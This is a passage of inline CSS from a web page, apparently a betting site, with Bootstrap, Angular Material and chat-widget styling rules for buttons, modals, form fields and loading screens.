      --bs-btn-box-shadow: inset 0 1px 0 rgba(255, 255, 255, .15), 0 1px 1px rgba(0, 0, 0, .075);
      --bs-btn-disabled-opacity: .65;
      --bs-btn-focus-box-shadow: 0 0 0 .25rem rgba(var(--bs-btn-focus-shadow-rgb), .5);
      display: inline-block;
      padding: var(--bs-btn-padding-y) var(--bs-btn-padding-x);
      font-family: var(--bs-btn-font-family);
      font-size: var(--bs-btn-font-size);
      font-weight: var(--bs-btn-font-weight);
      line-height: var(--bs-btn-line-height);
      color: var(--bs-btn-color);
      text-align: center;
      text-decoration: none;
      vertical-align: middle;
      cursor: pointer;
      -webkit-user-select: none;
      user-select: none;
      border: var(--bs-btn-border-width) solid var(--bs-btn-border-color);
      border-radius: var(--bs-btn-border-radius);
      background-color: var(--bs-btn-bg);
      transition: color .15s ease-in-out, background-color .15s ease-in-out, border-color .15s ease-in-out, box-shadow .15s ease-in-out
    }

    @media (prefers-reduced-motion: reduce) {
      .btn {
        transition: none
      }
    }

    .btn:hover {
      color: var(--bs-btn-hover-color);
      background-color: var(--bs-btn-hover-bg);
      border-color: var(--bs-btn-hover-border-color)
    }

    .btn:focus-visible {
      color: var(--bs-btn-hover-color);
      background-color: var(--bs-btn-hover-bg);
      border-color: var(--bs-btn-hover-border-color);
      outline: 0;
      box-shadow: var(--bs-btn-focus-box-shadow)
    }

    .btn:first-child:active {
      color: var(--bs-btn-active-color);
      background-color: var(--bs-btn-active-bg);
      border-color: var(--bs-btn-active-border-color)
    }

    .btn:first-child:active:focus-visible {
      box-shadow: var(--bs-btn-focus-box-shadow)
    }

    .btn:disabled {
      color: var(--bs-btn-disabled-color);
      pointer-events: none;
      background-color: var(--bs-btn-disabled-bg);
      border-color: var(--bs-btn-disabled-border-color);
      opacity: var(--bs-btn-disabled-opacity)
    }

    .fade {
      transition: opacity .15s linear
    }

    @media (prefers-reduced-motion: reduce) {
      .fade {
        transition: none
      }
    }

    .fade:not(.show) {
      opacity: 0
    }

    .modal {
      --bs-modal-zindex: 1055;
      --bs-modal-width: 500px;
      --bs-modal-padding: 1rem;
      --bs-modal-margin: .5rem;
      --bs-modal-color: ;
      --bs-modal-bg: var(--bs-body-bg);
      --bs-modal-border-color: var(--bs-border-color-translucent);
      --bs-modal-border-width: var(--bs-border-width);
      --bs-modal-border-radius: var(--bs-border-radius-lg);
      --bs-modal-box-shadow: var(--bs-box-shadow-sm);
      --bs-modal-inner-border-radius: calc(var(--bs-border-radius-lg) - (var(--bs-border-width)));
      --bs-modal-header-padding-x: 1rem;
      --bs-modal-header-padding-y: 1rem;
      --bs-modal-header-padding: 1rem 1rem;
      --bs-modal-header-border-color: var(--bs-border-color);
      --bs-modal-header-border-width: var(--bs-border-width);
      --bs-modal-title-line-height: 1.5;
      --bs-modal-footer-gap: .5rem;
      --bs-modal-footer-bg: ;
      --bs-modal-footer-border-color: var(--bs-border-color);
      --bs-modal-footer-border-width: var(--bs-border-width);
      position: fixed;
      top: 0;
      left: 0;
      z-index: var(--bs-modal-zindex);
      display: none;
      width: 100%;
      height: 100%;
      overflow-x: hidden;
      overflow-y: auto;
      outline: 0
    }

    .modal-dialog {
      position: relative;
      width: auto;
      margin: var(--bs-modal-margin);
      pointer-events: none
    }

    .modal.fade .modal-dialog {
      transition: transform .3s ease-out;
      transform: translateY(-50px)
    }

    @media (prefers-reduced-motion: reduce) {
      .modal.fade .modal-dialog {
        transition: none
      }
    }

    .modal-content {
      position: relative;
      display: flex;
      flex-direction: column;
      width: 100%;
      color: var(--bs-modal-color);
      pointer-events: auto;
      background-color: var(--bs-modal-bg);
      background-clip: padding-box;
      border: var(--bs-modal-border-width) solid var(--bs-modal-border-color);
      border-radius: var(--bs-modal-border-radius);
      outline: 0
    }

    @media (min-width: 576px) {
      .modal {
        --bs-modal-margin: 1.75rem;
        --bs-modal-box-shadow: var(--bs-box-shadow)
      }

      .modal-dialog {
        max-width: var(--bs-modal-width);
        margin-right: auto;
        margin-left: auto
      }

      .modal-sm {
        --bs-modal-width: 300px
      }
    }

    .text-center {
      text-align: center !important
    }

    .text-info {
      --bs-text-opacity: 1;
      color: rgba(var(--bs-info-rgb), var(--bs-text-opacity)) !important
    }

    @font-face {
      font-family: Montserrat;
      src: url(https://fonts.googleapis.com/css?family=Montserrat:400,700,900)
    }

    @font-face {
      font-family: Montserrat;
      src: url(https://fonts.googleapis.com/css?family=Montserrat:400,700,900);
      font-weight: 700
    }

    img {
      border-radius: 0 !important
    }

    #modal-download .modal-content {
      background-color: #002361;
      color: #fff;
      padding: 2em
    }

    body {
      font-size: 12px;
      font-family: Montserrat !important
    }

    body img {
      max-width: 100%
    }

    body .btn {
      border-radius: 50px !important;
      transition: .5s !important;
      background-size: 200% auto
    }

    body .btn:hover {
      background-position: right center
    }

    body .btn-orange {
      background-color: #00ae42 !important;
      color: #fff !important;
      border: #e93b0c !important
    }

    button:focus {
      outline: none
    }

    .text-justify {
      text-align: justify !important
    }

    .info-icon {
      font-size: 2.5rem
    }

    .text-info {
      --bs-text-opacity: 1;
      --info-color: 23, 162, 184;
      color: rgba(var(--info-color), var(--bs-text-opacity)) !important
    }

    html {
      --mat-option-selected-state-label-text-color: #43a047;
      --mat-option-label-text-color: rgba(0, 0, 0, .87);
      --mat-option-hover-state-layer-color: rgba(0, 0, 0, .04);
      --mat-option-focus-state-layer-color: rgba(0, 0, 0, .04);
      --mat-option-selected-state-layer-color: rgba(0, 0, 0, .04)
    }

    html {
      --mat-optgroup-label-text-color: rgba(0, 0, 0, .87)
    }

    html {
      --mat-option-label-text-font: Roboto, sans-serif;
      --mat-option-label-text-line-height: 24px;
      --mat-option-label-text-size: 16px;
      --mat-option-label-text-tracking: .03125em;
      --mat-option-label-text-weight: 400
    }

    html {
      --mat-optgroup-label-text-font: Roboto, sans-serif;
      --mat-optgroup-label-text-line-height: 24px;
      --mat-optgroup-label-text-size: 16px;
      --mat-optgroup-label-text-tracking: .03125em;
      --mat-optgroup-label-text-weight: 400
    }

    html {
      --mdc-filled-text-field-caret-color: #43a047;
      --mdc-filled-text-field-focus-active-indicator-color: #43a047;
      --mdc-filled-text-field-focus-label-text-color: rgba(67, 160, 71, .87);
      --mdc-filled-text-field-container-color: whitesmoke;
      --mdc-filled-text-field-disabled-container-color: #fafafa;
      --mdc-filled-text-field-label-text-color: rgba(0, 0, 0, .6);
      --mdc-filled-text-field-disabled-label-text-color: rgba(0, 0, 0, .38);
      --mdc-filled-text-field-input-text-color: rgba(0, 0, 0, .87);
      --mdc-filled-text-field-disabled-input-text-color: rgba(0, 0, 0, .38);
      --mdc-filled-text-field-input-text-placeholder-color: rgba(0, 0, 0, .6);
      --mdc-filled-text-field-error-focus-label-text-color: #f44336;
      --mdc-filled-text-field-error-label-text-color: #f44336;
      --mdc-filled-text-field-error-caret-color: #f44336;
      --mdc-filled-text-field-active-indicator-color: rgba(0, 0, 0, .42);
      --mdc-filled-text-field-disabled-active-indicator-color: rgba(0, 0, 0, .06);
      --mdc-filled-text-field-hover-active-indicator-color: rgba(0, 0, 0, .87);
      --mdc-filled-text-field-error-active-indicator-color: #f44336;
      --mdc-filled-text-field-error-focus-active-indicator-color: #f44336;
      --mdc-filled-text-field-error-hover-active-indicator-color: #f44336;
      --mdc-outlined-text-field-caret-color: #43a047;
      --mdc-outlined-text-field-focus-outline-color: #43a047;
      --mdc-outlined-text-field-focus-label-text-color: rgba(67, 160, 71, .87);
      --mdc-outlined-text-field-label-text-color: rgba(0, 0, 0, .6);
      --mdc-outlined-text-field-disabled-label-text-color: rgba(0, 0, 0, .38);
      --mdc-outlined-text-field-input-text-color: rgba(0, 0, 0, .87);
      --mdc-outlined-text-field-disabled-input-text-color: rgba(0, 0, 0, .38);
      --mdc-outlined-text-field-input-text-placeholder-color: rgba(0, 0, 0, .6);
      --mdc-outlined-text-field-error-caret-color: #f44336;
      --mdc-outlined-text-field-error-focus-label-text-color: #f44336;
      --mdc-outlined-text-field-error-label-text-color: #f44336;
      --mdc-outlined-text-field-outline-color: rgba(0, 0, 0, .38);
      --mdc-outlined-text-field-disabled-outline-color: rgba(0, 0, 0, .06);
      --mdc-outlined-text-field-hover-outline-color: rgba(0, 0, 0, .87);
      --mdc-outlined-text-field-error-focus-outline-color: #f44336;
      --mdc-outlined-text-field-error-hover-outline-color: #f44336;
      --mdc-outlined-text-field-error-outline-color: #f44336;
      --mat-form-field-disabled-input-text-placeholder-color: rgba(0, 0, 0, .38)
    }

    html {
      --mdc-filled-text-field-label-text-font: Roboto, sans-serif;
      --mdc-filled-text-field-label-text-size: 16px;
      --mdc-filled-text-field-label-text-tracking: .03125em;
      --mdc-filled-text-field-label-text-weight: 400;
      --mdc-outlined-text-field-label-text-font: Roboto, sans-serif;
      --mdc-outlined-text-field-label-text-size: 16px;
      --mdc-outlined-text-field-label-text-tracking: .03125em;
      --mdc-outlined-text-field-label-text-weight: 400;
      --mat-form-field-container-text-font: Roboto, sans-serif;
      --mat-form-field-container-text-line-height: 24px;
      --mat-form-field-container-text-size: 16px;
      --mat-form-field-container-text-tracking: .03125em;
      --mat-form-field-container-text-weight: 400;
      --mat-form-field-outlined-label-text-populated-size: 16px;
      --mat-form-field-subscript-text-font: Roboto, sans-serif;
      --mat-form-field-subscript-text-line-height: 20px;
      --mat-form-field-subscript-text-size: 12px;
      --mat-form-field-subscript-text-tracking: .0333333333em;
      --mat-form-field-subscript-text-weight: 400
    }

    html {
      --mat-select-panel-background-color: white;
      --mat-select-enabled-trigger-text-color: rgba(0, 0, 0, .87);
      --mat-select-disabled-trigger-text-color: rgba(0, 0, 0, .38);
      --mat-select-placeholder-text-color: rgba(0, 0, 0, .6);
      --mat-select-enabled-arrow-color: rgba(0, 0, 0, .54);
      --mat-select-disabled-arrow-color: rgba(0, 0, 0, .38);
      --mat-select-focused-arrow-color: rgba(67, 160, 71, .87);
      --mat-select-invalid-arrow-color: rgba(244, 67, 54, .87)
    }

    html {
      --mat-select-trigger-text-font: Roboto, sans-serif;
      --mat-select-trigger-text-line-height: 24px;
      --mat-select-trigger-text-size: 16px;
      --mat-select-trigger-text-tracking: .03125em;
      --mat-select-trigger-text-weight: 400
    }

    html {
      --mat-autocomplete-background-color: white
    }

    html {
      --mat-menu-item-label-text-color: rgba(0, 0, 0, .87);
      --mat-menu-item-icon-color: rgba(0, 0, 0, .87);
      --mat-menu-item-hover-state-layer-color: rgba(0, 0, 0, .04);
      --mat-menu-item-focus-state-layer-color: rgba(0, 0, 0, .04);
      --mat-menu-container-color: white
    }

    html {
      --mat-menu-item-label-text-font: Roboto, sans-serif;
      --mat-menu-item-label-text-size: 16px;
      --mat-menu-item-label-text-tracking: .03125em;
      --mat-menu-item-label-text-line-height: 24px;
      --mat-menu-item-label-text-weight: 400
    }

    html {
      --mat-paginator-container-text-color: rgba(0, 0, 0, .87);
      --mat-paginator-container-background-color: white;
      --mat-paginator-enabled-icon-color: rgba(0, 0, 0, .54);
      --mat-paginator-disabled-icon-color: rgba(0, 0, 0, .12)
    }

    html {
      --mat-paginator-container-size: 56px
    }

    html {
      --mat-paginator-container-text-font: Roboto, sans-serif;
      --mat-paginator-container-text-line-height: 20px;
      --mat-paginator-container-text-size: 12px;
      --mat-paginator-container-text-tracking: .0333333333em;
      --mat-paginator-container-text-weight: 400;
      --mat-paginator-select-trigger-text-size: 12px
    }

    html {
      --mdc-checkbox-disabled-selected-icon-color: rgba(0, 0, 0, .38);
      --mdc-checkbox-disabled-unselected-icon-color: rgba(0, 0, 0, .38);
      --mdc-checkbox-selected-checkmark-color: #fff;
      --mdc-checkbox-selected-focus-icon-color: #ff4081;
      --mdc-checkbox-selected-hover-icon-color: #ff4081;
      --mdc-checkbox-selected-icon-color: #ff4081;
      --mdc-checkbox-selected-pressed-icon-color: #ff4081;
      --mdc-checkbox-unselected-focus-icon-color: #212121;
      --mdc-checkbox-unselected-hover-icon-color: #212121;
      --mdc-checkbox-unselected-icon-color: rgba(0, 0, 0, .54);
      --mdc-checkbox-unselected-pressed-icon-color: rgba(0, 0, 0, .54);
      --mdc-checkbox-selected-focus-state-layer-color: #ff4081;
      --mdc-checkbox-selected-hover-state-layer-color: #ff4081;
      --mdc-checkbox-selected-pressed-state-layer-color: #ff4081;
      --mdc-checkbox-unselected-focus-state-layer-color: black;
      --mdc-checkbox-unselected-hover-state-layer-color: black;
      --mdc-checkbox-unselected-pressed-state-layer-color: black
    }

    html {
      --mdc-checkbox-state-layer-size: 40px
    }

    html {
      --mat-table-background-color: white;
      --mat-table-header-headline-color: rgba(0, 0, 0, .87);
      --mat-table-row-item-label-text-color: rgba(0, 0, 0, .87);
      --mat-table-row-item-outline-color: rgba(0, 0, 0, .12)
    }

    html {
      --mat-table-header-container-height: 56px;
      --mat-table-footer-container-height: 52px;
      --mat-table-row-item-container-height: 52px
    }

    html {
      --mat-table-header-headline-font: Roboto, sans-serif;
      --mat-table-header-headline-line-height: 22px;
      --mat-table-header-headline-size: 14px;
      --mat-table-header-headline-weight: 500;
      --mat-table-header-headline-tracking: .0071428571em;
      --mat-table-row-item-label-text-font: Roboto, sans-serif;
      --mat-table-row-item-label-text-line-height: 20px;
      --mat-table-row-item-label-text-size: 14px;
      --mat-table-row-item-label-text-weight: 400;
      --mat-table-row-item-label-text-tracking: .0178571429em;
      --mat-table-footer-supporting-text-font: Roboto, sans-serif;
      --mat-table-footer-supporting-text-line-height: 20px;
      --mat-table-footer-supporting-text-size: 14px;
      --mat-table-footer-supporting-text-weight: 400;
      --mat-table-footer-supporting-text-tracking: .0178571429em
    }

    html {
      --mat-badge-background-color: #43a047;
      --mat-badge-text-color: white;
      --mat-badge-disabled-state-background-color: #b9b9b9;
      --mat-badge-disabled-state-text-color: rgba(0, 0, 0, .38)
    }

    html {
      --mat-badge-text-font: Roboto, sans-serif;
      --mat-badge-text-size: 12px;
      --mat-badge-text-weight: 600;
      --mat-badge-small-size-text-size: 9px;
      --mat-badge-large-size-text-size: 24px
    }

    html {
      --mat-bottom-sheet-container-text-color: rgba(0, 0, 0, .87);
      --mat-bottom-sheet-container-background-color: white
    }

    html {
      --mat-bottom-sheet-container-text-font: Roboto, sans-serif;
      --mat-bottom-sheet-container-text-line-height: 20px;
      --mat-bottom-sheet-container-text-size: 14px;
      --mat-bottom-sheet-container-text-tracking: .0178571429em;
      --mat-bottom-sheet-container-text-weight: 400
    }

    html {
      --mat-legacy-button-toggle-text-color: rgba(0, 0, 0, .38);
      --mat-legacy-button-toggle-state-layer-color: rgba(0, 0, 0, .12);
      --mat-legacy-button-toggle-selected-state-text-color: rgba(0, 0, 0, .54);
      --mat-legacy-button-toggle-selected-state-background-color: #e0e0e0;
      --mat-legacy-button-toggle-disabled-state-text-color: rgba(0, 0, 0, .26);
      --mat-legacy-button-toggle-disabled-state-background-color: #eeeeee;
      --mat-legacy-button-toggle-disabled-selected-state-background-color: #bdbdbd;
      --mat-standard-button-toggle-text-color: rgba(0, 0, 0, .87);
      --mat-standard-button-toggle-background-color: white;
      --mat-standard-button-toggle-state-layer-color: black;
      --mat-standard-button-toggle-selected-state-background-color: #e0e0e0;
      --mat-standard-button-toggle-selected-state-text-color: rgba(0, 0, 0, .87);
      --mat-standard-button-toggle-disabled-state-text-color: rgba(0, 0, 0, .26);
      --mat-standard-button-toggle-disabled-state-background-color: white;
      --mat-standard-button-toggle-disabled-selected-state-text-color: rgba(0, 0, 0, .87);
      --mat-standard-button-toggle-disabled-selected-state-background-color: #bdbdbd;
      --mat-standard-button-toggle-divider-color: #e0e0e0
    }

    html {
      --mat-standard-button-toggle-height: 48px
    }

    html {
      --mat-legacy-button-toggle-text-font: Roboto, sans-serif;
      --mat-standard-button-toggle-text-font: Roboto, sans-serif
    }

    html {
      --mat-datepicker-calendar-date-selected-state-text-color: white;
      --mat-datepicker-calendar-date-selected-state-background-color: #43a047;
      --mat-datepicker-calendar-date-selected-disabled-state-background-color: rgba(67, 160, 71, .4);
      --mat-datepicker-calendar-date-today-selected-state-outline-color: white;
      --mat-datepicker-calendar-date-focus-state-background-color: rgba(67, 160, 71, .3);
      --mat-datepicker-calendar-date-hover-state-background-color: rgba(67, 160, 71, .3);
      --mat-datepicker-toggle-active-state-icon-color: #43a047;
      --mat-datepicker-calendar-date-in-range-state-background-color: rgba(67, 160, 71, .2);
      --mat-datepicker-calendar-date-in-comparison-range-state-background-color: rgba(249, 171, 0, .2);
      --mat-datepicker-calendar-date-in-overlap-range-state-background-color: #a8dab5;
      --mat-datepicker-calendar-date-in-overlap-range-selected-state-background-color: #46a35e;
      --mat-datepicker-toggle-icon-color: rgba(0, 0, 0, .54);
      --mat-datepicker-calendar-body-label-text-color: rgba(0, 0, 0, .54);
      --mat-datepicker-calendar-period-button-icon-color: rgba(0, 0, 0, .54);
      --mat-datepicker-calendar-navigation-button-icon-color: rgba(0, 0, 0, .54);
      --mat-datepicker-calendar-header-divider-color: rgba(0, 0, 0, .12);
      --mat-datepicker-calendar-header-text-color: rgba(0, 0, 0, .54);
      --mat-datepicker-calendar-date-today-outline-color: rgba(0, 0, 0, .38);
      --mat-datepicker-calendar-date-today-disabled-state-outline-color: rgba(0, 0, 0, .18);
      --mat-datepicker-calendar-date-text-color: rgba(0, 0, 0, .87);
      --mat-datepicker-calendar-date-outline-color: transparent;
      --mat-datepicker-calendar-date-disabled-state-text-color: rgba(0, 0, 0, .38);
      --mat-datepicker-calendar-date-preview-state-outline-color: rgba(0, 0, 0, .24);
      --mat-datepicker-range-input-separator-color: rgba(0, 0, 0, .87);
      --mat-datepicker-range-input-disabled-state-separator-color: rgba(0, 0, 0, .38);
      --mat-datepicker-range-input-disabled-state-text-color: rgba(0, 0, 0, .38);
      --mat-datepicker-calendar-container-background-color: white;
      --mat-datepicker-calendar-container-text-color: rgba(0, 0, 0, .87)
    }

    html {
      --mat-datepicker-calendar-text-font: Roboto, sans-serif;
      --mat-datepicker-calendar-text-size: 13px;
      --mat-datepicker-calendar-body-label-text-size: 14px;
      --mat-datepicker-calendar-body-label-text-weight: 500;
      --mat-datepicker-calendar-period-button-text-size: 14px;
      --mat-datepicker-calendar-period-button-text-weight: 500;
      --mat-datepicker-calendar-header-text-size: 11px;
      --mat-datepicker-calendar-header-text-weight: 400
    }

    html {
      --mat-divider-color: rgba(0, 0, 0, .12)
    }

    html {
      --mat-expansion-container-background-color: white;
      --mat-expansion-container-text-color: rgba(0, 0, 0, .87);
      --mat-expansion-actions-divider-color: rgba(0, 0, 0, .12);
      --mat-expansion-header-hover-state-layer-color: rgba(0, 0, 0, .04);
      --mat-expansion-header-focus-state-layer-color: rgba(0, 0, 0, .04);
      --mat-expansion-header-disabled-state-text-color: rgba(0, 0, 0, .26);
      --mat-expansion-header-text-color: rgba(0, 0, 0, .87);
      --mat-expansion-header-description-color: rgba(0, 0, 0, .54);
      --mat-expansion-header-indicator-color: rgba(0, 0, 0, .54)
    }

    html {
      --mat-expansion-header-collapsed-state-height: 48px;
      --mat-expansion-header-expanded-state-height: 64px
    }

    html {
      --mat-expansion-header-text-font: Roboto, sans-serif;
      --mat-expansion-header-text-size: 14px;
      --mat-expansion-header-text-weight: 500;
      --mat-expansion-header-text-line-height: inherit;
      --mat-expansion-header-text-tracking: inherit;
      --mat-expansion-container-text-font: Roboto, sans-serif;
      --mat-expansion-container-text-line-height: 20px;
      --mat-expansion-container-text-size: 14px;
      --mat-expansion-container-text-tracking: .0178571429em;
      --mat-expansion-container-text-weight: 400
    }

    html {
      --mat-grid-list-tile-header-primary-text-size: 14px;
      --mat-grid-list-tile-header-secondary-text-size: 12px;
      --mat-grid-list-tile-footer-primary-text-size: 14px;
      --mat-grid-list-tile-footer-secondary-text-size: 12px
    }

    html {
      --mat-icon-color: inherit
    }

    html {
      --mat-sidenav-container-divider-color: rgba(0, 0, 0, .12);
      --mat-sidenav-container-background-color: white;
      --mat-sidenav-container-text-color: rgba(0, 0, 0, .87);
      --mat-sidenav-content-background-color: #fafafa;
      --mat-sidenav-content-text-color: rgba(0, 0, 0, .87);
      --mat-sidenav-scrim-color: rgba(0, 0, 0, .6)
    }

    html {
      --mat-stepper-header-icon-foreground-color: white;
      --mat-stepper-header-selected-state-icon-background-color: #43a047;
      --mat-stepper-header-selected-state-icon-foreground-color: white;
      --mat-stepper-header-done-state-icon-background-color: #43a047;
      --mat-stepper-header-done-state-icon-foreground-color: white;
      --mat-stepper-header-edit-state-icon-background-color: #43a047;
      --mat-stepper-header-edit-state-icon-foreground-color: white;
      --mat-stepper-container-color: white;
      --mat-stepper-line-color: rgba(0, 0, 0, .12);
      --mat-stepper-header-hover-state-layer-color: rgba(0, 0, 0, .04);
      --mat-stepper-header-focus-state-layer-color: rgba(0, 0, 0, .04);
      --mat-stepper-header-label-text-color: rgba(0, 0, 0, .54);
      --mat-stepper-header-optional-label-text-color: rgba(0, 0, 0, .54);
      --mat-stepper-header-selected-state-label-text-color: rgba(0, 0, 0, .87);
      --mat-stepper-header-error-state-label-text-color: #f44336;
      --mat-stepper-header-icon-background-color: rgba(0, 0, 0, .54);
      --mat-stepper-header-error-state-icon-foreground-color: #f44336;
      --mat-stepper-header-error-state-icon-background-color: transparent
    }

    html {
      --mat-stepper-header-height: 72px
    }

    html {
      --mat-stepper-container-text-font: Roboto, sans-serif;
      --mat-stepper-header-label-text-font: Roboto, sans-serif;
      --mat-stepper-header-label-text-size: 14px;
      --mat-stepper-header-label-text-weight: 400;
      --mat-stepper-header-error-state-label-text-size: 16px;
      --mat-stepper-header-selected-state-label-text-size: 16px;
      --mat-stepper-header-selected-state-label-text-weight: 400
    }

    html {
      --mat-toolbar-container-background-color: whitesmoke;
      --mat-toolbar-container-text-color: rgba(0, 0, 0, .87)
    }

    html {
      --mat-toolbar-standard-height: 64px;
      --mat-toolbar-mobile-height: 56px
    }

    html {
      --mat-toolbar-title-text-font: Roboto, sans-serif;
      --mat-toolbar-title-text-line-height: 32px;
      --mat-toolbar-title-text-size: 20px;
      --mat-toolbar-title-text-tracking: .0125em;
      --mat-toolbar-title-text-weight: 500
    }
  </style>
  <link rel="stylesheet" href="styles1.css" media="all" onload="this.media='all'"><noscript>
    <link rel="stylesheet" href="styles1.css">
  </noscript>
  <style>
    .production-mode {
      display: none
    }

    .development-mode {
      display: block
    }

    code {
      font-family: source-code-pro, Menlo, Monaco, Consolas, Courier New, monospace
    }

    .ReactModal__Body--open {
      overflow: hidden
    }

    .ReactModal__Overlay.Smart_Search_Modal {
      opacity: 0;
      -webkit-transition: opacity .15s linear;
      transition: opacity .15s linear
    }

    .ReactModal__Overlay--after-open.Smart_Search_Modal {
      opacity: 1
    }

    .ReactModal__Overlay--before-close.Smart_Search_Modal {
      opacity: 0
    }

    .ReactModal__Content.Smart_Search_Modal {
      background-color: var(--smartSearchModal__content__bg-color) !important
    }

    .ReactModal__Overlay.Quick_Bet_Modal {
      opacity: 0;
      -webkit-transition: opacity .15s linear;
      transition: opacity .15s linear
    }

    .ReactModal__Overlay--after-open.Quick_Bet_Modal {
      opacity: 1
    }

    .ReactModal__Overlay--before-close.Quick_Bet_Modal {
      opacity: 0
    }

    .ReactModal__Content.Quick_Bet_Modal {
      background: var(--quickBetModal__content__bg-color) !important
    }

    .popup-content {
      margin: auto;
      background: #fff;
      width: 50%;
      padding: 5px;
      border: 1px solid #d7d7d7
    }

    [role=tooltip].popup-content {
      width: 200px;
      box-shadow: 0 0 3px #00000029;
      border-radius: 5px
    }

    .popup-overlay {
      background: #00000080
    }

    [data-popup=tooltip].popup-overlay {
      background: transparent
    }

    .popup-arrow {
      -webkit-filter: drop-shadow(0 -3px 3px rgba(0, 0, 0, .16));
      filter: drop-shadow(0 -3px 3px rgba(0, 0, 0, .16));
      color: #fff;
      stroke-width: 2px;
      stroke: #d7d7d7;
      stroke-dasharray: 30px;
      stroke-dashoffset: -54px;
      left: 0;
      right: 0;
      top: 0;
      bottom: 0
    }
  </style>
  <style type="text/css">
    .cx-common-container.cx-loading .cx-loading-screen,
    .cx-common-container.cx-loading .cx-smokescreen {
      display: block
    }

    .cx-common-container.cx-waiting .cx-loading-screen {
      display: block;
      pointer-events: none;
      background: none
    }

    .cx-loading-screen {
      display: none;
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%
    }

    .cx-loading-container {
      display: none;
      position: relative
    }

    .cx-loading-container .cx-loading-icon,
    .cx-loading-screen .cx-loading-icon {
      display: inline-block;
      height: 50px;
      width: 50px;
      left: -25px;
      margin-left: 50%;
      position: relative;
      top: 50%;
      -webkit-transform: translateY(-50%);
      -ms-transform: translateY(-50%);
      transform: translateY(-50%)
    }

    .cx-loading-container svg,
    .cx-loading-screen svg {
      -webkit-animation: cxloadingspin 4s linear infinite;
      -moz-animation: cxloadingspin 4s linear infinite;
      animation: cxloadingspin 4s linear infinite
    }

    @-moz-keyframes cxloadingspin {
      0% {
        -moz-transform: rotate(0deg)
      }

      to {
        -moz-transform: rotate(1turn)
      }
    }

    @-webkit-keyframes cxloadingspin {
      0% {
        -webkit-transform: rotate(0deg)
      }

      to {
        -webkit-transform: rotate(1turn)
      }
    }

    @keyframes cxloadingspin {
      0% {
        transform: rotate(0deg)
      }

      to {
        transform: rotate(1turn)
      }
    }

    .cx-common-container,
    .cx-drop-shadow {
      -webkit-box-shadow: 0 0 21px 2px rgba(0, 0, 0, .2);
      box-shadow: 0 0 21px 2px rgba(0, 0, 0, .2)
    }

    .cx-common-container {
      box-sizing: border-box;
      -moz-box-sizing: border-box;
      -webkit-box-sizing: border-box
    }

    .cx-common-container button,
    .cx-common-container form {
      outline: none
    }

    .cx-common-container * {
      box-sizing: border-box;
      -moz-box-sizing: border-box;
      -webkit-box-sizing: border-box
    }

    .cx-common-container ::-webkit-scrollbar {
      width: 5px;
      height: 5px
    }

    .cx-common-container .cx-titlebar {
      clear: both;
      border-width: 0 0 1px;
      border-style: solid;
      padding: 14px 20px;
      background-color: inherit
    }

    .cx-common-container .cx-titlebar .cx-icon {
      float: left;
      width: 24px;
      height: 24px;
      margin-top: 2px
    }

    .cx-common-container .cx-titlebar .cx-title {
      display: inline-block;
      font-size: 1.5em;
      margin: 0 0 0 8px;
      font-weight: lighter
    }

    .cx-common-container .cx-titlebar .cx-close {
      float: right
    }

    .cx-common-container .cx-titlebar .cx-close .cx-button-close {
      font-size: 1em
    }

    .cx-common-container .cx-body {
      padding: 24px 24px 0;
      overflow: auto;
      clear: both;
      position: relative
    }

    .cx-common-container .cx-body ::-webkit-scrollbar {
      width: 5px;
      height: 5px
    }

    .cx-common-container .cx-button-container {
      font-size: .75em;
      line-height: 1em
    }

    .cx-common-container .cx-button-container .cx-button-group .cx-btn {
      margin: 12px 0 0
    }

    .cx-common-container .cx-button-container .cx-button-group .cx-text {
      margin: 20px 0;
      line-height: 1em
    }

    .cx-common-container .cx-dialog-container,
    .cx-common-container .cx-smokescreen {
      position: absolute;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      display: none
    }

    .cx-common-container .cx-dialog-container {
      padding: 48px 96px;
      font-size: .875em
    }

    .cx-common-container .cx-dialog-container .cx-dialog {
      border: 1px solid;
      padding: 24px;
      top: 28px;
      position: relative;
      display: none
    }

    .cx-common-container .cx-footer {
      padding: 14px 24px 18px;
      background-color: inherit
    }

    .cx-common-container .cx-footer .cx-powered-by {
      font-size: .625em
    }

    .cx-common-container .cx-branding {
      padding: 10px 12px 26px 15px
    }

    .cx-common-container .cx-branding .cx-icon {
      float: left;
      width: 16px;
      height: 16px
    }

    .cx-common-container .cx-email-link {
      font-weight: 700
    }

    .cx-common-container .cx-powered-by .cx-icon {
      position: relative;
      top: 2px
    }

    .cx-common-container .cx-powered-by .cx-icon svg {
      width: 59px;
      height: 14px
    }

    .cx-common-container .cx-buttons-window-control {
      position: absolute;
      top: 12px;
      right: 12px;
      font-size: 1em;
      overflow: hidden
    }

    .cx-common-container .cx-buttons-window-control button {
      display: none;
      padding: 0;
      background-color: transparent;
      border: 0;
      width: 20px;
      height: 20px;
      padding: 2px;
      margin-left: 6px
    }

    .cx-common-container .cx-buttons-window-control button:focus {
      border: 1px solid;
      border-width: 2px;
      padding: 1px
    }

    .cx-footer .cx-button-group .cx-button-group {
      margin-bottom: 0
    }

    .cx-button-group {
      overflow: auto
    }

    .cx-buttons-single {
      text-align: center
    }

    .cx-buttons-single .cx-btn-default,
    .cx-buttons-single .cx-btn-primary {
      float: none
    }

    .cx-buttons-binary .cx-btn-primary {
      float: right
    }

    .cx-buttons-binary .cx-btn-default {
      float: left
    }

    .cx-buttons-primary .cx-btn-primary {
      float: right
    }

    .cx-buttons-primary .cx-text {
      float: left;
      margin-left: 16px
    }

    .cx-buttons-default .cx-btn-default {
      float: left
    }

    .cx-buttons-default .cx-text {
      float: right;
      margin-right: 16px
    }

    .cx-common-container.cx-close .cx-buttons-window-control button.cx-button-close,
    .cx-common-container.cx-minimize .cx-buttons-window-control button.cx-button-maximize,
    .cx-common-container.cx-minimize .cx-buttons-window-control button.cx-button-minimize {
      display: inline-block
    }

    .cx-common-container.cx-minimized .cx-buttons-window-control .cx-button-maximize svg {
      -ms-transform: rotate(180deg);
      -webkit-transform: rotate(180deg);
      transform: rotate(180deg);
      border-bottom: 1px transparent
    }

    .cx-common-container.cx-mobile .cx-btn {
      padding: 5px 14px
    }

    .cx-common-container.cx-mobile .cx-titlebar {
      padding: 9px 11px
    }

    .cx-common-container.cx-mobile .cx-titlebar .cx-icon {
      margin-left: 13px
    }

    .cx-common-container.cx-mobile .cx-buttons-window-control {
      top: 7px;
      right: 0;
      overflow: visible !important
    }

    .cx-common-container.cx-mobile .cx-buttons-window-control>button {
      margin-right: 10px;
      padding: 4px;
      width: 24px;
      height: 32px
    }

